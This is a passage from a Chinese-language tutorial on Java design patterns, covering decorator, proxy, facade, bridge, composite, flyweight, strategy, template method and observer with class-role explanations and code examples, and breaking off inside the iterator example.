Adapter 里，将 src 作为一个对象，持有。 接口适配器，以接口给到，在 Adapter 里，将 src 作为一个接口，实现。 使用选择： 根据合成复用原则，组合大于继承。因此，类的适配器模式应该少用。 # # 6 装饰者模式 定义：动态的将新功能附加到对象上。在对象功能扩展方面，它比继承更有弹性。 # 6.1 装饰者模式结构图与代码示例 1.Component（被装饰对象的基类） 定义一个对象接口，可以给这些对象动态地添加职责。 2.ConcreteComponent（具体被装饰对象） 定义一个对象，可以给这个对象添加一些职责。 3.Decorator（装饰者抽象类） 维持一个指向 Component 实例的引用，并定义一个与 Component 接口一致的接口。 4.ConcreteDecorator（具体装饰者） 具体的装饰对象，给内部持有的具体被装饰对象，增加具体的职责。 被装饰对象和修饰者继承自同一个超类 举例(咖啡馆订单项目：1）、咖啡种类：Espresso、ShortBlack、LongBlack、Decaf2）、调料（装饰者）：Milk、Soy、Chocolate)，类图如下： 被装饰的对象和装饰者都继承自同一个超类 12345678910111213141516171819202122232425public abstract class Drink { public String description=&quot;&quot;; private float price=0f;; public void setDescription(String description) { this.description=description; } public String getDescription() { return description+&quot;-&quot;+this.getPrice(); } public float getPrice() { return price; } public void setPrice(float price) { this.price=price; } public abstract float cost(); } 被装饰的对象，不用去改造。原来怎么样写，现在还是怎么写。 12345678public class Coffee extends Drink { @Override public float cost() { // TODO Auto-generated method stub return super.getPrice(); } } coffee 类的实现 1234567public class Decaf extends Coffee { public Decaf() { super.setDescription(&quot;Decaf&quot;); super.setPrice(3.0f); }} 装饰者 装饰者不仅要考虑自身，还要考虑被它修饰的对象，它是在被修饰的对象上继续添加修饰。例如，咖啡里面加牛奶，再加巧克力。加糖后价格为 coffee+milk。再加牛奶价格为 coffee+milk+chocolate。 123456789101112131415public class Decorator extends Drink { private Drink Obj; public Decorator(Drink Obj) { this.Obj = Obj; }; @Override public float cost() { // TODO Auto-generated method stub return super.getPrice() + Obj.cost(); } @Override public String getDescription() { return super.description + &quot;-&quot; + super.getPrice() + &quot;&amp;&amp;&quot; + Obj.getDescription(); }} 装饰者实例化（加牛奶）。这里面要对被修饰的对象进行实例化。 12345678public class Milk extends Decorator { public Milk(Drink Obj) { super(Obj); // TODO Auto-generated constructor stub super.setDescription(&quot;Milk&quot;); super.setPrice(2.0f); }} coffee 店：初始化一个被修饰对象，修饰者实例需要对被修改者实例化，才能对具体的被修饰者进行修饰。 123456789101112131415public class CoffeeBar { public static void main(String[] args) { Drink order; order = new Decaf(); System.out.println(&quot;order1 price:&quot; + order.cost()); System.out.println(&quot;order1 desc:&quot; + order.getDescription()); System.out.println(&quot;****************&quot;); order = new LongBlack(); order = new Milk(order); order = new Chocolate(order); order = new Chocolate(order); System.out.println(&quot;order2 price:&quot; + order.cost()); System.out.println(&quot;order2 desc:&quot; + order.getDescription()); }} 6.2 总结 装饰者和被装饰者之间必须是一样的类型，也就是要有共同的超类。在这里应用继承并不是实现方法的复制，而是实现类型的匹配。因为装饰者和被装饰者是同一个类型，因此装饰者可以取代被装饰者，这样就使被装饰者拥有了装饰者独有的行为。根据装饰者模式的理念，我们可以在任何时候，实现新的装饰者增加新的行为。如果是用继承，每当需要增加新的行为时，就要修改原程序了。 # # # 7 代理模式 ** 定义：** 代理模式给某一个对象提供一个代理对象，并由代理对象控制对原对象的引用。通俗的来讲代理模式就是我们生活中常见的中介。 举个例子来说明：假如说我现在想买一辆二手车，虽然我可以自己去找车源，做质量检测等一系列的车辆过户流程，但是这确实太浪费我得时间和精力了。我只是想买一辆车而已为什么我还要额外做这么多事呢？于是我就通过中介公司来买车，他们来给我找车源，帮我办理车辆过户流程，我只是负责选择自己喜欢的车，然后付钱就可以了。用图表示如下： # 7.1 为什么要用代理模式？ ** 中介隔离作用：** 在某些情况下，一个客户类不想或者不能直接引用一个委托对象，而代理类对象可以在客户类和委托对象之间起到中介的作用，其特征是代理类和委托类实现相同的接口。 ** 开闭原则，增加功能：** 代理类除了是客户类和委托类的中介之外，我们还可以通过给代理类增加额外的功能来扩展委托类的功能，这样做我们只需要修改代理类而不需要再修改委托类，符合代码设计的开闭原则。代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后对返回结果的处理等。代理类本身并不真正实现服务，而是同过调用委托类的相关方法，来提供特定的服务。真正的业务功能还是由委托类来实现，但是可以在业务功能执行的前后加入一些公共的服务。例如我们想给项目加入缓存、日志这些功能，我们就可以使用代理类来完成，而没必要打开已经封装好的委托类。 代理模式分为三类：1. 静态代理 2. 动态代理 3. CGLIB 代理 7.2 静态代理 举例(买房），类图如下： 第一步：创建服务类接口 123public interface BuyHouse { void buyHosue();} 第二步：实现服务接口 123456public class BuyHouseImpl implements BuyHouse { @Override public void buyHosue() { System.out.println(&quot;我要买房&quot;); }} 第三步：创建代理类 123456789101112public class BuyHouseProxy implements BuyHouse { private BuyHouse buyHouse; public BuyHouseProxy(final BuyHouse buyHouse) { this.buyHouse = buyHouse; } @Override public void buyHosue() { System.out.println(&quot;买房前准备&quot;); buyHouse.buyHosue(); System.out.println(&quot;买房后装修&quot;); }} 总结： 优点：可以做到在符合开闭原则的情况下对目标对象进行功能扩展。 缺点： 代理对象与目标对象要实现相同的接口，我们得为每一个服务都得创建代理类，工作量太大，不易管理。同时接口一旦发生改变，代理类也得相应修改。 # 7.3 动态代理 动态代理有以下特点: 1. 代理对象，不需要实现接口 2. 代理对象的生成，是利用 JDK 的 API, 动态的在内存中构建代理对象 (需要我们指定创建代理对象 / 目标对象实现的接口的类型) 代理类不用再实现接口了。但是，要求被代理对象必须有接口。 动态代理实现： Java.lang.reflect.Proxy 类可以直接生成一个代理对象 Proxy.newProxyInstance (ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) 生成一个代理对象 参数 1:ClassLoader loader 代理对象的类加载器 一般使用被代理对象的类加载器 参数 2:Class&lt;?&gt;[] interfaces 代理对象的要实现的接口 一般使用的被代理对象实现的接口 参数 3:InvocationHandler h (接口) 执行处理类 InvocationHandler 中的 invoke (Object proxy, Method method, Object [] args) 方法：调用代理类的任何方法，此方法都会执行 参数 3.1: 代理对象 (慎用) 参数 3.2: 当前执行的方法 参数 3.3: 当前执行的方法运行时传递过来的参数 第一步：编写动态处理器 12345678910111213public class DynamicProxyHandler implements InvocationHandler { private Object object; public DynamicProxyHandler(final Object object) { this.object = object; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(&quot;买房前准备&quot;); Object result = method.invoke(object, args); System.out.println(&quot;买房后装修&quot;); return result; }} 第二步：编写测试类 12345678public class DynamicProxyTest { public static void main(String[] args) { BuyHouse buyHouse = new BuyHouseImpl(); BuyHouse proxyBuyHouse = (BuyHouse) Proxy.newProxyInstance(BuyHouse.class.getClassLoader(), new Class[]{BuyHouse.class}, new DynamicProxyHandler(buyHouse)); proxyBuyHouse.buyHosue(); }} ** 动态代理总结：** 虽然相对于静态代理，动态代理大大减少了我们的开发任务，同时减少了对业务接口的依赖，降低了耦合度。但是还是有一点点小小的遗憾之处，那就是它始终无法摆脱仅支持 interface 代理的桎梏（我们要使用被代理的对象的接口），因为它的设计注定了这个遗憾。 7.4 CGLIB 代理 CGLIB 原理：动态生成一个要代理类的子类，子类重写要代理的类的所有不是 final 的方法。在子类中采用方法拦截的技术拦截所有父类方法的调用，顺势织入横切逻辑。它比使用 java 反射的 JDK 动态代理要快。 CGLIB 底层：使用字节码处理框架 ASM，来转换字节码并生成新的类。不鼓励直接使用 ASM，因为它要求你必须对 JVM 内部结构包括 class 文件的格式和指令集都很熟悉。 CGLIB 缺点：对于 final 方法，无法进行代理。 CGLIB 的实现步骤： 第一步：建立拦截器 1234567891011public Object intercept(Object object, Method method, Object[] args, MethodProxy methodProxy) throws Throwable { System.out.println(&quot;买房前准备&quot;); Object result = methodProxy.invoke(object, args); System.out.println(&quot;买房后装修&quot;); return result; } 参数：Object 为由 CGLib 动态生成的代理类实例，Method 为上文中实体类所调用的被代理的方法引用，Object [] 为参数值列表，MethodProxy 为生成的代理类对方法的代理引用。 返回：从代理实例的方法调用返回的值。 其中，proxy.invokeSuper(obj,arg) 调用代理类实例上的 proxy 方法的父类方法（即实体类 TargetObject 中对应的方法） 第二步： 生成动态代理类 12345678910111213141516public class CglibProxy implements MethodInterceptor { private Object target; public Object getInstance(final Object target) { this.target = target; Enhancer enhancer = new Enhancer(); enhancer.setSuperclass(this.target.getClass()); enhancer.setCallback(this); return enhancer.create(); } public Object intercept(Object object, Method method, Object[] args, MethodProxy methodProxy) throws Throwable { System.out.println(&quot;买房前准备&quot;); Object result = methodProxy.invoke(object, args); System.out.println(&quot;买房后装修&quot;); return result; }} 这里 Enhancer 类是 CGLib 中的一个字节码增强器，它可以方便的对你想要处理的类进行扩展，以后会经常看到它。 首先将被代理类 TargetObject 设置成父类，然后设置拦截器 TargetInterceptor，最后执行 enhancer.create () 动态生成一个代理类，并从 Object 强制转型成父类型 TargetObject。 第三步：测试 12345678public class CglibProxyTest { public static void main(String[] args){ BuyHouse buyHouse = new BuyHouseImpl(); CglibProxy cglibProxy = new CglibProxy(); BuyHouseImpl buyHouseCglibProxy = (BuyHouseImpl) cglibProxy.getInstance(buyHouse); buyHouseCglibProxy.buyHosue(); }} CGLIB 代理总结：** CGLIB 创建的动态代理对象比 JDK 创建的动态代理对象的性能更高，但是 CGLIB 创建代理对象时所花费的时间却比 JDK 多得多。所以对于单例的对象，因为无需频繁创建对象，用 CGLIB 合适，反之使用 JDK 方式要更为合适一些。同时由于 CGLib 由于是采用动态创建子类的方法，对于 final 修饰的方法无法进行代理。** # 8 外观模式 定义： 隐藏了系统的复杂性，并向客户端提供了一个可以访问系统的接口。 # 8.1 模式结构和代码示例 简单来说，该模式就是把一些复杂的流程封装成一个接口供给外部用户更简单的使用。这个模式中，设计到 3 个角色。 1）. 门面角色：外观模式的核心。它被客户角色调用，它熟悉子系统的功能。内部根据客户角色的需求预定了几种功能的组合。（客户调用，同时自身调用子系统功能） 2）. 子系统角色：实现了子系统的功能。它对客户角色和 Facade 时未知的。它内部可以有系统内的相互交互，也可以由供外界调用的接口。（实现具体功能） 3）. 客户角色：通过调用 Facede 来完成要实现的功能（调用门面角色）。 举例（每个 Computer 都有 CPU、Memory、Disk。在 Computer 开启和关闭的时候，相应的部件也会开启和关闭），类图如下： 首先是子系统类： 123456789101112131415161718192021222324252627282930public class CPU { public void start() { System.out.println(&quot;cpu is start...&quot;); } public void shutDown() { System.out.println(&quot;CPU is shutDown...&quot;); }}public class Disk { public void start() { System.out.println(&quot;Disk is start...&quot;); } public void shutDown() { System.out.println(&quot;Disk is shutDown...&quot;); }}public class Memory { public void start() { System.out.println(&quot;Memory is start...&quot;); } public void shutDown() { System.out.println(&quot;Memory is shutDown...&quot;); }} 然后是，门面类 Facade 12345678910111213141516171819202122232425262728public class Computer { private CPU cpu; private Memory memory; private Disk disk; public Computer() { cpu = new CPU(); memory = new Memory(); disk = new Disk(); } public void start() { System.out.println(&quot;Computer start begin&quot;); cpu.start(); disk.start(); memory.start(); System.out.println(&quot;Computer start end&quot;); } public void shutDown() { System.out.println(&quot;Computer shutDown begin&quot;); cpu.shutDown(); disk.shutDown(); memory.shutDown(); System.out.println(&quot;Computer shutDown end...&quot;); }} 最后为，客户角色 12345678910public class Client { public static void main(String[] args) { Computer computer = new Computer(); computer.start(); System.out.println(&quot;=================&quot;); computer.shutDown(); }} # 8.2 优点 ** - 松散耦合 ** 使得客户端和子系统之间解耦，让子系统内部的模块功能更容易扩展和维护； ** - 简单易用 ** 客户端根本不需要知道子系统内部的实现，或者根本不需要知道子系统内部的构成，它只需要跟 Facade 类交互即可。 ** - 更好的划分访问层次 ** 有些方法是对系统外的，有些方法是系统内部相互交互的使用的。子系统把那些暴露给外部的功能集中到门面中，这样就可以实现客户端的使用，很好的隐藏了子系统内部的细节。 # 9 桥接模式 定义： 将抽象部分与它的实现部分分离，使它们都可以独立地变化。 # 9.1 案例 看下图手机与手机软件的类图 增加一款新的手机软件，需要在所有手机品牌类下添加对应的手机软件类，当手机软件种类较多时，将导致类的个数急剧膨胀，难以维护 手机和手机中的软件是什么关系？ 手机中的软件从本质上来说并不是一种手机，手机软件运行在手机中，是一种包含与被包含关系，而不是一种父与子或者说一般与特殊的关系，通过继承手机类实现手机软件类的设计是违反一般规律的。 如果 Oppo 手机实现了 wifi 功能，继承它的 Oppo 应用商城也会继承 wifi 功能，并且 Oppo 手机类的任何变动，都会影响其子类 换一种解决思路 从类图上看起来更像是手机软件类图，涉及到手机本身相关的功能，比如说：wifi 功能，放到哪个类中实现呢？放到 OppoAppStore 中实现显然是不合适的 引起整个结构变化的元素有两个，一个是手机品牌，一个是手机软件，所以我们将这两个点抽出来，分别进行封装 # 9.2 桥接模式结构和代码示例 类图： 实现： 123456789101112131415161718public interface Software { public void run();}public class AppStore implements Software { @Override public void run() { System.out.println(&quot;run app store&quot;); }}public class Camera implements Software { @Override public void run() { System.out.println(&quot;run camera&quot;); }} 抽象： 12345678910111213141516171819202122232425public abstract class Phone { protected Software software; public void setSoftware(Software software) { this.software = software; } public abstract void run();}public class Oppo extends Phone { @Override public void run() { software.run(); }}public class Vivo extends Phone { @Override public void run() { software.run(); }} 对比最初的设计，将抽象部分（手机）与它的实现部分（手机软件类）分离，将实现部分抽象成单独的类，使它们都可以独立地变化。整个类图看起来像一座桥，所以称为桥接模式 继承是一种强耦合关系，子类的实现与它的父类有非常紧密的依赖关系，父类的任何变化 都会导致子类发生变化，因此继承或者说强耦合关系严重影响了类的灵活性，并最终限制了可复用性 从桥接模式的设计上我们可以看出聚合是一种比继承要弱的关联关系，手机类和软件类都可独立的进行变化，不会互相影响 # 9.3 适用场景 桥接模式通常适用于以下场景。 当一个类存在两个独立变化的维度，且这两个维度都需要进行扩展时。 当一个系统不希望使用继承或因为多层次继承导致系统类的个数急剧增加时。 当一个系统需要在构件的抽象化角色和具体化角色之间增加更多的灵活性时。 # 9.4 优缺点 优点： (1) 在很多情况下，桥接模式可以取代多层继承方案，多层继承方案违背了 “单一职责原则”，复用性较差，且类的个数非常多，桥接模式是比多层继承方案更好的解决方法，它极大减少了子类的个数。 (2) 桥接模式提高了系统的可扩展性，在两个变化维度中任意扩展一个维度，都不需要修改原有系统，符合 “开闭原则”。 缺点： 桥接模式的使用会增加系统的理解与设计难度，由于关联关系建立在抽象层，要求开发者一开始就针对抽象层进行设计与编程。 # 10 组合模式 ** 定义：** 有时又叫作部分 - 整体模式，它是一种将对象组合成树状的层次结构的模式，用来表示 “部分 - 整体” 的关系，使用户对单个对象和组合对象具有一致的访问性。 ** 意图：** 将对象组合成树形结构以表示 &quot;部分 - 整体&quot; 的层次结构。组合模式使得用户对单个对象和组合对象的使用具有一致性。 ** 主要解决：** 它在我们树型结构的问题中，模糊了简单元素和复杂元素的概念，客户程序可以向处理简单元素一样来处理复杂元素，从而使得客户程序与复杂元素的内部结构解耦。 何时使用： 1、您想表示对象的部分 - 整体层次结构（树形结构）。 2、您希望用户忽略组合对象与单个对象的不同，用户将统一地使用组合结构中的所有对象。 ** 如何解决：** 树枝和叶子实现统一接口，树枝内部组合该接口。 ** 关键代码：** 树枝内部组合该接口，并且含有内部属性 List，里面放 Component。 组合模式的主要优点有： 组合模式使得客户端代码可以一致地处理单个对象和组合对象，无须关心自己处理的是单个对象，还是组合对象，这简化了客户端代码； 更容易在组合体内加入新的对象，客户端不会因为加入了新的对象而更改源代码，满足 “开闭原则”； 其主要缺点是： 设计较复杂，客户端需要花更多时间理清类之间的层次关系； 不容易限制容器中的构件； 不容易用继承的方法来增加构件的新功能； # 10.1 模式结构和代码示例 抽象构件（Component）角色：它的主要作用是为树叶构件和树枝构件声明公共接口，并实现它们的默认行为。在透明式的组合模式中抽象构件还声明访问和管理子类的接口；在安全式的组合模式中不声明访问和管理子类的接口，管理工作由树枝构件完成。 树叶构件（Leaf）角色：是组合中的叶节点对象，它没有子节点，用于实现抽象构件角色中 声明的公共接口。 树枝构件（Composite）角色：是组合中的分支节点对象，它有子节点。它实现了抽象构件角色中声明的接口，它的主要作用是存储和管理子部件，通常包含 Add ()、Remove ()、GetChild () 等方法 举例（访问一颗树），类图如下： 1 组件 1234567public interface Component { public void add(Component c); public void remove(Component c); public Component getChild(int i); public void operation();} 2 叶子 12345678910111213141516171819202122232425262728public class Leaf implements Component{ private String name; public Leaf(String name) { this.name = name; } @Override public void add(Component c) {} @Override public void remove(Component c) {} @Override public Component getChild(int i) { // TODO Auto-generated method stub return null; } @Override public void operation() { // TODO Auto-generated method stub System.out.println(&quot;树叶&quot;+name+&quot;：被访问！&quot;); }} 3 树枝 12345678910111213141516171819202122public class Composite implements Component { private ArrayList&lt;Component&gt; children = new ArrayList&lt;Component&gt;(); public void add(Component c) { children.add(c); } public void remove(Component c) { children.remove(c); } public Component getChild(int i) { return children.get(i); } public void operation() { for (Object obj : children) { ((Component) obj).operation(); } }} # # 11 享元模式 ** 定义：** 通过共享的方式高效的支持大量细粒度的对象。 ** 主要解决：** 在有大量对象时，有可能会造成内存溢出，我们把其中共同的部分抽象出来，如果有相同的业务请求，直接返回在内存中已有的对象，避免重新创建。 何时使用： 1、系统中有大量对象。 2、这些对象消耗大量内存。 3、这些对象的状态大部分可以外部化。 4、这些对象可以按照内蕴状态分为很多组，当把外蕴对象从对象中剔除出来时，每一组对象都可以用一个对象来代替。 5、系统不依赖于这些对象身份，这些对象是不可分辨的。 ** 如何解决：** 用唯一标识码判断，如果在内存中有，则返回这个唯一标识码所标识的对象。 ** 关键代码：** 用 HashMap 存储这些对象。 应用实例： 1、JAVA 中的 String，如果有则返回，如果没有则创建一个字符串保存在字符串缓存池里面。 ** 优点：** 大大减少对象的创建，降低系统的内存，使效率提高。 ** 缺点：** 提高了系统的复杂度，需要分离出外部状态和内部状态，而且外部状态具有固有化的性质，不应该随着内部状态的变化而变化，否则会造成系统的混乱。 简单来说，我们抽取出一个对象的外部状态（不能共享）和内部状态（可以共享）。然后根据外部状态的决定是否创建内部状态对象。内部状态对象是通过哈希表保存的，当外部状态相同的时候，不再重复的创建内部状态对象，从而减少要创建对象的数量。 # 11.1 享元模式的结构图和代码示例 1、Flyweight (享元抽象类)：一般是接口或者抽象类，定义了享元类的公共方法。这些方法可以分享内部状态的数据，也可以调用这些方法修改外部状态。 2、ConcreteFlyweight (具体享元类)：具体享元类实现了抽象享元类的方法，为享元对象开辟了内存空间来保存享元对象的内部数据，同时可以通过和单例模式结合只创建一个享元对象。 3、FlyweightFactory (享元工厂类)：享元工厂类创建并且管理享元类，享元工厂类针对享元类来进行编程，通过提供一个享元池来进行享元对象的管理。一般享元池设计成键值对，或者其他的存储结构来存储。当客户端进行享元对象的请求时，如果享元池中有对应的享元对象则直接返回对应的对象，否则工厂类创建对应的享元对象并保存到享元池。 举例（JAVA 中的 String，如果有则返回，如果没有则创建一个字符串保存在字符串缓存池里面）。类图如下： （1）创建享元对象接口 123public interface IFlyweight { void print();} （2）创建具体享元对象 12345678910111213public class Flyweight implements IFlyweight { private String id; public Flyweight(String id){ this.id = id; } @Override public void print() { System.out.println(&quot;Flyweight.id = &quot; + getId() + &quot; ...&quot;); } public String getId() { return id; }} （3）创建工厂，这里要特别注意，为了避免享元对象被重复创建，我们使用 HashMap 中的 key 值保证其唯一。 1234567891011121314public class FlyweightFactory { private Map&lt;String, IFlyweight&gt; flyweightMap = new HashMap(); public IFlyweight getFlyweight(String str){ IFlyweight flyweight = flyweightMap.get(str); if(flyweight == null){ flyweight = new Flyweight(str); flyweightMap.put(str, flyweight); } return flyweight; } public int getFlyweightMapSize(){ return flyweightMap.size(); }} （4）测试，我们创建三个字符串，但是只会产生两个享元对象 12345678910111213public class MainTest { public static void main(String[] args) { FlyweightFactory flyweightFactory = new FlyweightFactory(); IFlyweight flyweight1 = flyweightFactory.getFlyweight(&quot;A&quot;); IFlyweight flyweight2 = flyweightFactory.getFlyweight(&quot;B&quot;); IFlyweight flyweight3 = flyweightFactory.getFlyweight(&quot;A&quot;); flyweight1.print(); flyweight2.print(); flyweight3.print(); System.out.println(flyweightFactory.getFlyweightMapSize()); }} # # C、关系模式（11 种） 先来张图，看看这 11 中模式的关系： 第一类：通过父类与子类的关系进行实现。 第二类：两个类之间。 第三类：类的状态。 第四类：通过中间类 # 12 策略模式 定义： 策略模式定义了一系列算法，并将每个算法封装起来，使他们可以相互替换，且算法的变化不会影响到使用算法的客户。 ** 意图：** 定义一系列的算法，把它们一个个封装起来，并且使它们可相互替换。 ** 主要解决：** 在有多种算法相似的情况下，使用 if…else 所带来的复杂和难以维护。 ** 何时使用：** 一个系统有许多许多类，而区分它们的只是他们直接的行为。 ** 如何解决：** 将这些算法封装成一个一个的类，任意地替换。 ** 关键代码：** 实现同一个接口。 优点： 1、算法可以自由切换。 2、避免使用多重条件判断。 3、扩展性良好。 缺点： 1、策略类会增多。 2、所有策略类都需要对外暴露。 # 12.1 策略模式结构和示例代码 抽象策略角色: 这个是一个抽象的角色，通常情况下使用接口或者抽象类去实现。对比来说，就是我们的 Comparator 接口。 具体策略角色: 包装了具体的算法和行为。对比来说，就是实现了 Comparator 接口的实现一组实现类。 环境角色: 内部会持有一个抽象角色的引用，给客户端调用。 举例如下（ 实现一个加减的功能），类图如下： 1、定义抽象策略角色 1234public interface Strategy { public int calc(int num1,int num2);} 2、定义具体策略角色 123456789101112131415161718public class AddStrategy implements Strategy { @Override public int calc(int num1, int num2) { // TODO Auto-generated method stub return num1 + num2; }}public class SubstractStrategy implements Strategy { @Override public int calc(int num1, int num2) { // TODO Auto-generated method stub return num1 - num2; }} 3、环境角色 123456789101112public class Environment { private Strategy strategy; public Environment(Strategy strategy) { this.strategy = strategy; } public int calculate(int a, int b) { return strategy.calc(a, b); }} 4、测试 12345678910111213public class MainTest { public static void main(String[] args) { Environment environment=new Environment(new AddStrategy()); int result=environment.calculate(20, 5); System.out.println(result); Environment environment1=new Environment(new SubstractStrategy()); int result1=environment1.calculate(20, 5); System.out.println(result1); }} # # 13 模板模式 ** 定义：** 定义一个操作中算法的骨架，而将一些步骤延迟到子类中，模板方法使得子类可以不改变算法的结构即可重定义该算法的某些特定步骤。 通俗点的理解就是 ：完成一件事情，有固定的数个步骤，但是每个步骤根据对象的不同，而实现细节不同；就可以在父类中定义一个完成该事情的总方法，按照完成事件需要的步骤去调用其每个步骤的实现方法。每个步骤的具体实现，由子类完成。 # 13.1 模式结构和代码示例 抽象父类（AbstractClass）：实现了模板方法，定义了算法的骨架。 具体类（ConcreteClass)：实现抽象类中的抽象方法，即不同的对象的具体实现细节。 举例（ 我们做菜可以分为三个步骤 （1）备料 （2）具体做菜 （3）盛菜端给客人享用，这三部就是算法的骨架 ；然而做不同菜需要的料，做的方法，以及如何盛装给客人享用都是不同的这个就是不同的实现细节。）。类图如下： a. 先来写一个抽象的做菜父类： 12345678910111213141516171819202122public abstract class Dish { /** * 具体的整个过程 */ protected void dodish(){ this.preparation(); this.doing(); this.carriedDishes(); } /** * 备料 */ public abstract void preparation(); /** * 做菜 */ public abstract void doing(); /** * 上菜 */ public abstract void carriedDishes ();} b. 下来做两个番茄炒蛋（EggsWithTomato）和红烧肉（Bouilli）实现父类中的抽象方法 123456789101112131415161718192021222324252627282930313233343536public class EggsWithTomato extends Dish { @Override public void preparation() { System.out.println(&quot;洗并切西红柿，打鸡蛋。&quot;); } @Override public void doing() { System.out.println(&quot;鸡蛋倒入锅里，然后倒入西红柿一起炒。&quot;); } @Override public void carriedDishes() { System.out.println(&quot;将炒好的西红寺鸡蛋装入碟子里，端给客人吃。&quot;); }}public class Bouilli extends Dish{ @Override public void preparation() { System.out.println(&quot;切猪肉和土豆。&quot;); } @Override public void doing() { System.out.println(&quot;将切好的猪肉倒入锅中炒一会然后倒入土豆连炒带炖。&quot;); } @Override public void carriedDishes() { System.out.println(&quot;将做好的红烧肉盛进碗里端给客人吃。&quot;); }} c. 在测试类中我们来做菜： 123456789101112public class MainTest { public static void main(String[] args) { Dish eggsWithTomato = new EggsWithTomato(); eggsWithTomato.dodish(); System.out.println(&quot;-----------------------------&quot;); Dish bouilli = new Bouilli(); bouilli.dodish(); }} # 13.2 模板模式的优点和缺点 优点： （1）具体细节步骤实现定义在子类中，子类定义详细处理算法是不会改变算法整体结构。 （2）代码复用的基本技术，在数据库设计中尤为重要。 （3）存在一种反向的控制结构，通过一个父类调用其子类的操作，通过子类对父类进行扩展增加新的行为，符合 “开闭原则”。 # 缺点： 每个不同的实现都需要定义一个子类，会导致类的个数增加，系统更加庞大。 # # 14 观察者模式 定义： 定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新。 ** 主要解决：** 一个对象状态改变给其他对象通知的问题，而且要考虑到易用和低耦合，保证高度的协作。 ** 何时使用：** 一个对象（目标对象）的状态发生改变，所有的依赖对象（观察者对象）都将得到通知，进行广播通知。 ** 如何解决：** 使用面向对象技术，可以将这种依赖关系弱化。 ** 关键代码：** 在抽象类里有一个 ArrayList 存放观察者们。 优点： 1、观察者和被观察者是抽象耦合的。 2、建立一套触发机制。 缺点： 1、如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。 2、如果在观察者和观察目标之间有循环依赖的话，观察目标会触发它们之间进行循环调用，可能导致系统崩溃。 3、观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化。 # 14.1 模式结构图和代码示例 抽象被观察者角色：也就是一个抽象主题，它把所有对观察者对象的引用保存在一个集合中，每个主题都可以有任意数量的观察者。抽象主题提供一个接口，可以增加和删除观察者角色。一般用一个抽象类和接口来实现。 抽象观察者角色：为所有的具体观察者定义一个接口，在得到主题通知时更新自己。 具体被观察者角色：也就是一个具体的主题，在集体主题的内部状态改变时，所有登记过的观察者发出通知。 具体观察者角色：实现抽象观察者角色所需要的更新接口，一边使本身的状态与制图的状态相协调。 举例（有一个微信公众号服务，不定时发布一些消息，关注公众号就可以收到推送消息，取消关注就收不到推送消息。）类图如下： 1、定义一个抽象被观察者接口 1234567public interface Subject { public void registerObserver(Observer o); public void removeObserver(Observer o); public void notifyObserver();} 2、定义一个抽象观察者接口 12345public interface Observer { public void update(String message);} 3、定义被观察者，实现了 Observerable 接口，对 Observerable 接口的三个方法进行了具体实现，同时有一个 List 集合，用以保存注册的观察者，等需要通知观察者时，遍历该集合即可。 123456789101112131415161718192021222324252627282930313233343536373839public class WechatServer implements Subject { private List&lt;Observer&gt; list; private String message; public WechatServer() { list = new ArrayList&lt;Observer&gt;(); } @Override public void registerObserver(Observer o) { // TODO Auto-generated method stub list.add(o); } @Override public void removeObserver(Observer o) { // TODO Auto-generated method stub if (!list.isEmpty()) { list.remove(o); } } @Override public void notifyObserver() { // TODO Auto-generated method stub for (Observer o : list) { o.update(message); } } public void setInfomation(String s) { this.message = s; System.out.println(&quot;微信服务更新消息： &quot; + s); // 消息更新，通知所有观察者 notifyObserver(); }} 4、定义具体观察者，微信公众号的具体观察者为用户 User 1234567891011121314151617181920public class User implements Observer { private String name; private String message; public User(String name) { this.name = name; } @Override public void update(String message) { this.message = message; read(); } public void read() { System.out.println(name + &quot; 收到推送消息： &quot; + message); }} 5、编写一个测试类 12345678910111213141516171819202122public class MainTest { public static void main(String[] args) { WechatServer server = new WechatServer(); Observer userZhang = new User(&quot;ZhangSan&quot;); Observer userLi = new User(&quot;LiSi&quot;); Observer userWang = new User(&quot;WangWu&quot;); server.registerObserver(userZhang); server.registerObserver(userLi); server.registerObserver(userWang); server.setInfomation(&quot;PHP是世界上最好用的语言！&quot;); System.out.println(&quot;----------------------------------------------&quot;); server.removeObserver(userZhang); server.setInfomation(&quot;JAVA是世界上最好用的语言！&quot;); }} # 15 迭代器模式 ** 定义：** 提供一种方法顺序访问一个聚合对象中各个元素，而又无须暴露该对象的内部表示。 简单来说，不同种类的对象可能需要不同的遍历方式，我们对每一种类型的对象配一个迭代器，最后多个迭代器合成一个。 ** 主要解决：** 不同的方式来遍历整个整合对象。 ** 何时使用：** 遍历一个聚合对象。 ** 如何解决：** 把在元素之间游走的责任交给迭代器，而不是聚合对象。 ** 关键代码：** 定义接口：hasNext, next。 ** 应用实例：**JAVA 中的 iterator。 优点： 1、它支持以不同的方式遍历一个聚合对象。 2、迭代器简化了聚合类。 3、在同一个聚合上可以有多个遍历。 4、在迭代器模式中，增加新的聚合类和迭代器类都很方便，无须修改原有代码。 ** 缺点：** 由于迭代器模式将存储数据和遍历数据的职责分离，增加新的聚合类需要对应增加新的迭代器类，类的个数成对增加，这在一定程度上增加了系统的复杂性。 # 15.1 模式结构和代码示例 (1) 迭代器角色（Iterator）: 定义遍历元素所需要的方法，一般来说会有这么三个方法：取得下一个元素的方法 next ()，判断是否遍历结束的方法 hasNext ()），移出当前对象的方法 remove (), (2) 具体迭代器角色（Concrete Iterator）：实现迭代器接口中定义的方法，完成集合的迭代。 (3) 容器角色 (Aggregate): 一般是一个接口，提供一个 iterator () 方法，例如 java 中的 Collection 接口，List 接口，Set 接口等 (4) 具体容器角色（ConcreteAggregate）：就是抽象容器的具体实现类，比如 List 接口的有序列表实现 ArrayList，List 接口的链表实现 LinkList，Set 接口的哈希列表的实现 HashSet 等。 举例（咖啡厅和中餐厅合并，他们两个餐厅的菜单一个是数组保存的，一个是 ArrayList 保存的。遍历方式不一样，使用迭代器聚合访问，只需要一种方式） 1 迭代器接口 123456public interface Iterator { public boolean hasNext(); public Object next(); } 2 咖啡店菜单和咖啡店菜单遍历器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class CakeHouseMenu { private ArrayList&lt;MenuItem&gt; menuItems; public CakeHouseMenu() { menuItems = new ArrayList&lt;MenuItem&gt;(); addItem(&quot;KFC Cake 